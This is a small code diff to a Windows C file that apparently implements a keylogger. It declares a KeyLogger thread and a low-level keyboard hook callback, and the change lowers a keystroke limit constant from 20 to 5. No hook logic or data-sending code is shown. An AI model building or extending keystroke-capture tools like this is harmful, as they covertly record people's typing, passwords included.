@@ -3,7 +3,7 @@
 #include <stdio.h>
 #include <stdbool.h>
 #include "log.h"
-#define LIMITE_TECLAS 20
+#define LIMITE_TECLAS 5
 int iniciaThread(char* argv[]);
 DWORD WINAPI KeyLogger(LPVOID lpParameter);
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
